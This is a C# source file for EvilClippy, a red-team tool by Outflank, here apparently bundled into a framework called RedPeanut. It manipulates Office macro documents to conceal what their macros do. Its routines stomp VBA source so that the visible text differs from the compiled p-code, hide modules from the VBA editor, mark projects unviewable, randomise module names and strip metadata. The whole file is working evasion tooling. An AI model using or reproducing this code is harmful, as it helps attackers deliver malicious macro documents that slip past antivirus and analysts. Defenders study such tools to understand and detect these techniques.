// EvilClippy 
// Cross-platform CFBF and MS-OVBA manipulation assistant
//
// Author: Stan Hegt (@StanHacked) / Outflank
// Date: 20190330
// Version: 1.1 (added support for xls, xlsm and docm)
//
// Special thanks to Carrie Robberts (@OrOneEqualsOne) from Walmart for her contributions to this project.
//
// Compilation instructions
// Mono: mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
// Visual studio developer command prompt: csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 

using Kavod.Vba.Compression;
using OpenMcdf;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace RedPeanut
{
    public class MSOfficeManipulator
    {
        // Name of the generated output file.
        static string outFilename = "";

        // Compound file that is under editing
        static CompoundFile cf;

        // Byte arrays for holding stream data of file
        static byte[] vbaProjectStream;
        static byte[] dirStream;
        static byte[] projectStream;
        static byte[] projectwmStream;

        CFStorage commonStorage;
        // List of target VBA modules to stomp, if empty => all modules will be stomped
        List<string> targetModules;
        string oleFilename;
        //Temp path to unzip OpenXML files to
        string unzipTempPath = "";

        string projectStreamString;
        string projectwmStreamString;

        List<ModuleInformation> vbaModules;

        bool is_OpenXML = false;

        public MSOfficeManipulator(string filename, string[] names)
        {

            targetModules = new List<string>();

            foreach (string s in names)
                targetModules.Add(s);

            // OLE Filename (make a copy so we don't overwrite the original)
            outFilename = getOutFilename(filename);
            oleFilename = outFilename;

            // Attempt to unzip as docm or xlsm OpenXML format
            try
            {
                unzipTempPath = CreateUniqueTempDirectory();
                ZipFile.ExtractToDirectory(filename, unzipTempPath);
                if (File.Exists(Path.Combine(unzipTempPath, "word", "vbaProject.bin"))) { oleFilename = Path.Combine(unzipTempPath, "word", "vbaProject.bin"); }
                else if (File.Exists(Path.Combine(unzipTempPath, "xl", "vbaProject.bin"))) { oleFilename = Path.Combine(unzipTempPath, "xl", "vbaProject.bin"); }
                is_OpenXML = true;
            }
            catch (Exception)
            {
                // Not OpenXML format, Maybe 97-2003 format, Make a copy
                if (File.Exists(outFilename)) File.Delete(outFilename);
                File.Copy(filename, outFilename);
            }

            // Open OLE compound file for editing
            try
            {
                cf = new CompoundFile(oleFilename, CFSUpdateMode.Update, 0);
            }
            catch (Exception e)
            {
                Console.WriteLine("ERROR: Could not open file " + filename);
                Console.WriteLine("Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.");
                Console.WriteLine();
                Console.WriteLine(e.Message);
                return;
            }

            // Read relevant streams
            commonStorage = cf.RootStorage; // docm or xlsm
            if (cf.RootStorage.TryGetStorage("Macros") != null) commonStorage = cf.RootStorage.GetStorage("Macros"); // .doc
            if (cf.RootStorage.TryGetStorage("_VBA_PROJECT_CUR") != null) commonStorage = cf.RootStorage.GetStorage("_VBA_PROJECT_CUR"); // xls		
            vbaProjectStream = commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").GetData();
            projectStream = commonStorage.GetStream("project").GetData();
            projectwmStream = commonStorage.GetStream("projectwm").GetData();
            dirStream = Decompress(commonStorage.GetStorage("VBA").GetStream("dir").GetData());

            // Read project streams as string
            projectStreamString = Encoding.UTF8.GetString(projectStream);
            projectwmStreamString = Encoding.UTF8.GetString(projectwmStream);

            // Find all VBA modules in current file
            vbaModules = ParseModulesFromDirStream(dirStream);

            // Write streams to debug log (if verbosity enabled)
            //Console.WriteLine("Hex dump of original _VBA_PROJECT stream:\n" + Utils.HexDump(vbaProjectStream));
            //Console.WriteLine("Hex dump of original dir stream:\n" + Utils.HexDump(dirStream));
            //Console.WriteLine("Hex dump of original project stream:\n" + Utils.HexDump(projectStream));

        }

        public string Commit()
        {
            // Commit changes and close file
            cf.Commit();
            cf.Close();

            // Purge unused space in file
            CompoundFile.ShrinkCompoundFile(oleFilename);

            // Zip the file back up as a docm or xlsm
            if (is_OpenXML)
            {
                if (File.Exists(outFilename)) File.Delete(outFilename);
                ZipFile.CreateFromDirectory(unzipTempPath, outFilename);
                // Delete Temporary Files
                Directory.Delete(unzipTempPath, true);
            }

            return outFilename;
        }

        public void SetTargetOfficeVersion(string targetOfficeVersion)
        {
            ReplaceOfficeVersionInVBAProject(vbaProjectStream, targetOfficeVersion);
            commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(vbaProjectStream);
        }

        public void UnviewableVBA()
        {
            string tmpStr = Regex.Replace(projectStreamString, "CMG=\".*\"", "CMG=\"\"");
            string newProjectStreamString = Regex.Replace(tmpStr, "GC=\".*\"", "GC=\"\"");
            // Write changes to project stream
            commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
        }

        public void ViewableVBA()
        {
            string tmpStr0 = Regex.Replace(projectStreamString, "CMG=\".*\"", "CMG=\"CAC866BE34C234C230C630C6\"");
            string tmpStr1 = Regex.Replace(tmpStr0, "ID=\".*\"", "ID=\"{00000000-0000-0000-0000-000000000000}\"");
            string tmpStr = Regex.Replace(tmpStr1, "DPB=\".*\"", "DPB=\"94963888C84FE54FE5B01B50E59251526FE67A1CC76C84ED0DAD653FD058F324BFD9D38DED37\"");
            string newProjectStreamString = Regex.Replace(tmpStr, "GC=\".*\"", "GC=\"5E5CF2C27646414741474\"");

            // Write changes to project stream
            commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
        }

        public void HideInGUI()
        {
            foreach (var vbaModule in vbaModules)
            {
                if ((vbaModule.moduleName != "ThisDocument") && (vbaModule.moduleName != "ThisWorkbook"))
                {
                    Console.WriteLine("Hiding module: " + vbaModule.moduleName);
                    projectStreamString = projectStreamString.Replace("Module=" + vbaModule.moduleName, "");
                }
            }

            // Write changes to project stream
            commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(projectStreamString));
        }

        public void UnhideInGUI()
        {
            ArrayList vbaModulesNamesFromProjectwm = getModulesNamesFromProjectwmStream(projectwmStreamString);
            Regex theregex = new Regex(@"(Document\=.*\/.{10})([\S\s]*?)(ExeName32\=|Name\=|ID\=|Class\=|BaseClass\=|Package\=|HelpFile\=|HelpContextID\=|Description\=|VersionCompatible32\=|CMG\=|DPB\=|GC\=)");
            Match m = theregex.Match(projectStreamString);
            if (m.Groups.Count != 4)
            {
                Console.WriteLine("Error, could not find the location to insert module names. Not able to unhide modules");
            }
            else
            {
                string moduleString = "\r\n";

                foreach (var vbaModuleName in vbaModulesNamesFromProjectwm)
                {
                    Console.WriteLine("Unhiding module: " + vbaModuleName);
                    moduleString = moduleString.Insert(moduleString.Length, "Module=" + vbaModuleName + "\r\n");
                }

                projectStreamString = projectStreamString.Replace(m.Groups[0].Value, m.Groups[1].Value + moduleString + m.Groups[3].Value);

                // write changes to project stream
                commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(projectStreamString));
            }
        }

        public void StompVBAModules(string VBASourceFileName)
        {
            byte[] streamBytes;

            foreach (var vbaModule in vbaModules)
            {
                Console.WriteLine("VBA module name: " + vbaModule.moduleName + "\nOffset for code: " + vbaModule.textOffset);

                // If this module is a target module, or if no targets are specified, then stomp
                if (targetModules.Contains(vbaModule.moduleName) || !targetModules.Any())
                {
                    Console.WriteLine("Now stomping VBA code in module: " + vbaModule.moduleName);

                    streamBytes = commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).GetData();

                    Console.WriteLine("Existing VBA source:\n" + GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset));

                    // Get new VBA source code from specified text file. If not specified, VBA code is removed completely.
                    string newVBACode = "";
                    if (VBASourceFileName != "")
                    {
                        try
                        {
                            newVBACode = System.IO.File.ReadAllText(VBASourceFileName);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("ERROR: Could not open VBA source file " + VBASourceFileName);
                            Console.WriteLine("Please make sure this file exists and contains ASCII only characters.");
                            Console.WriteLine();
                            Console.WriteLine(e.Message);
                            return;
                        }
                    }

                    Console.WriteLine("Replacing with VBA code:\n" + newVBACode);

                    streamBytes = ReplaceVBATextInModuleStream(streamBytes, vbaModule.textOffset, newVBACode);

                    //Console.WriteLine("Hex dump of VBA module stream " + vbaModule.moduleName + ":\n" + Utils.HexDump(streamBytes));

                    commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).SetData(streamBytes);
                }
            }
        }

        public void SetRandomNames()
        {
            Console.WriteLine("Setting random ASCII names for VBA modules in dir stream (while leaving unicode names intact).");

            // Recompress and write to dir stream
            commonStorage.GetStorage("VBA").GetStream("dir").SetData(Compress(SetRandomNamesInDirStream(dirStream)));
        }

        public void ResetModuleNames()
        {
            Console.WriteLine("Resetting module names in dir stream to match names is _VBA_PROJECT stream (undo SetRandomNames option)");

            // Recompress and write to dir stream
            commonStorage.GetStorage("VBA").GetStream("dir").SetData(Compress(ResetModuleNamesInDirStream(dirStream)));
        }

        public void DeleteMetadata()
        {
            try
            {
                cf.RootStorage.Delete("\u0005SummaryInformation");
            }
            catch (Exception)
            {
                Console.WriteLine("ERROR: metadata stream does not exist (option ignored)");
            }
        }

        private static byte[] ReplaceOfficeVersionInVBAProject(byte[] moduleStream, string officeVersion)
        {
            byte[] version = new byte[2];

            switch (officeVersion)
            {
                case "2010x86":
                    version[0] = 0x97;
                    version[1] = 0x00;
                    break;
                case "2013x86":
                    version[0] = 0xA3;
                    version[1] = 0x00;
                    break;
                case "2016x86":
                    version[0] = 0xAF;
                    version[1] = 0x00;
                    break;
                case "2013x64":
                    version[0] = 0xA6;
                    version[1] = 0x00;
                    break;
                case "2016x64":
                    version[0] = 0xB2;
                    version[1] = 0x00;
                    break;
                case "2019x64":
                    version[0] = 0xB2;
                    version[1] = 0x00;
                    break;
                default:
                    Console.WriteLine("ERROR: Incorrect MS Office version specified - skipping this step.");
                    return moduleStream;
            }

            Console.WriteLine("Targeting pcode on Office version: " + officeVersion);

            moduleStream[2] = version[0];
            moduleStream[3] = version[1];

            return moduleStream;
        }

        private static ArrayList getModulesNamesFromProjectwmStream(string projectwmStreamString)
        {
            ArrayList vbaModulesNamesFromProjectwm = new ArrayList();
            Regex theregex = new Regex(@"(?<=\0{3})([^\0]+?)(?=\0)");
            MatchCollection matches = theregex.Matches(projectwmStreamString);

            foreach (Match match in matches)
            {
                vbaModulesNamesFromProjectwm.Add(match.Value);
            }

            return vbaModulesNamesFromProjectwm;
        }

        public static string getOutFilename(String filename)
        {
            string fn = Path.GetFileNameWithoutExtension(filename);
            string ext = Path.GetExtension(filename);
            string path = Path.GetDirectoryName(filename);
            return Path.Combine(path, fn + "_EvilClippy" + ext);
        }

        public static string CreateUniqueTempDirectory()
        {
            var uniqueTempDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()));
            Directory.CreateDirectory(uniqueTempDir);
            return uniqueTempDir;
        }

        private static byte[] ReplaceVBATextInModuleStream(byte[] moduleStream, UInt32 textOffset, string newVBACode)
        {
            return moduleStream.Take((int)textOffset).Concat(Compress(Encoding.UTF8.GetBytes(newVBACode))).ToArray();
        }

        private static string GetVBATextFromModuleStream(byte[] moduleStream, UInt32 textOffset)
        {
            string vbaModuleText = System.Text.Encoding.UTF8.GetString(Decompress(moduleStream.Skip((int)textOffset).ToArray()));

            return vbaModuleText;
        }

        private static byte[] SetRandomNamesInDirStream(byte[] dirStream)
        {
            // 2.3.4.2 dir Stream: Version Independent Project Information
            // https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx
            // Dir stream is ALWAYS in little endian

            int offset = 0;
            UInt16 tag;
            UInt32 wLength;

            while (offset < dirStream.Length)
            {
                tag = GetWord(dirStream, offset);
                wLength = GetDoubleWord(dirStream, offset + 2);

                // The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp
                if (tag == 9)
                    wLength = 6;
                else if (tag == 3)
                    wLength = 2;

                switch (tag)
                {
                    case 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record
                        System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
                        encoding.GetBytes(Utils.RandomString((int)wLength), 0, (int)wLength, dirStream, (int)offset + 6);

                        break;
                }

                offset += 6;
                offset += (int)wLength;
            }

            return dirStream;
        }

        private static byte[] ResetModuleNamesInDirStream(byte[] dirStream)
        {
            // 2.3.4.2 dir Stream: Version Independent Project Information
            // https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx
            // Dir stream is ALWAYS in little endian

            int offset = 0;
            UInt16 tag;
            UInt32 wLength;

            while (offset < dirStream.Length)
            {
                tag = GetWord(dirStream, offset);
                wLength = GetDoubleWord(dirStream, offset + 2);

                // The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp
                if (tag == 9)
                    wLength = 6;
                else if (tag == 3)
                    wLength = 2;

                switch (tag)
                {
                    case 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record
                        System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
                        UInt32 wLengthOrig = wLength;
                        int offsetOrig = offset;
                        offset += 6;
                        offset += (int)wLength;
                        tag = GetWord(dirStream, offset);
                        wLength = GetDoubleWord(dirStream, offset + 2);
                        string moduleNameFromUnicode = System.Text.Encoding.Unicode.GetString(dirStream.Skip(offset + 6).Take((int)wLength).ToArray());
                        encoding.GetBytes(moduleNameFromUnicode, 0, (int)wLengthOrig, dirStream, (int)offsetOrig + 6);
                        break;
                }

                offset += 6;
                offset += (int)wLength;
            }

            return dirStream;
        }

        private static List<ModuleInformation> ParseModulesFromDirStream(byte[] dirStream)
        {
            // 2.3.4.2 dir Stream: Version Independent Project Information
            // https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx
            // Dir stream is ALWAYS in little endian

            List<ModuleInformation> modules = new List<ModuleInformation>();

            int offset = 0;
            UInt16 tag;
            UInt32 wLength;
            ModuleInformation currentModule = new ModuleInformation { moduleName = "", textOffset = 0 };

            while (offset < dirStream.Length)
            {
                tag = GetWord(dirStream, offset);
                wLength = GetDoubleWord(dirStream, offset + 2);

                // The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp
                if (tag == 9)
                    wLength = 6;
                else if (tag == 3)
                    wLength = 2;

                switch (tag)
                {
                    case 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record
                        currentModule.moduleName = System.Text.Encoding.UTF8.GetString(dirStream, (int)offset + 6, (int)wLength);
                        break;
                    case 49: // 2.3.4.2.3.2.5 MODULEOFFSET Record
                        currentModule.textOffset = GetDoubleWord(dirStream, offset + 6);
                        modules.Add(currentModule);
                        currentModule = new ModuleInformation { moduleName = "", textOffset = 0 };
                        break;
                }

                offset += 6;
                offset += (int)wLength;
            }

            return modules;
        }

        public class ModuleInformation
        {
            public string moduleName; // Name of VBA module stream

            public UInt32 textOffset; // Offset of VBA source code in VBA module stream
        }

        private static UInt16 GetWord(byte[] buffer, int offset)
        {
            var rawBytes = new byte[2];

            Array.Copy(buffer, offset, rawBytes, 0, 2);
            //if (!BitConverter.IsLittleEndian) {
            //	Array.Reverse(rawBytes);
            //}

            return BitConverter.ToUInt16(rawBytes, 0);
        }

        private static UInt32 GetDoubleWord(byte[] buffer, int offset)
        {
            var rawBytes = new byte[4];

            Array.Copy(buffer, offset, rawBytes, 0, 4);
            //if (!BitConverter.IsLittleEndian) {
            //	Array.Reverse(rawBytes);
            //}

            return BitConverter.ToUInt32(rawBytes, 0);
        }

        private static byte[] Compress(byte[] data)
        {
            var buffer = new DecompressedBuffer(data);
            var container = new CompressedContainer(buffer);
            return container.SerializeData();
        }

        private static byte[] Decompress(byte[] data)
        {
            var container = new CompressedContainer(data);
            var buffer = new DecompressedBuffer(container);
            return buffer.Data;
        }
    }
}
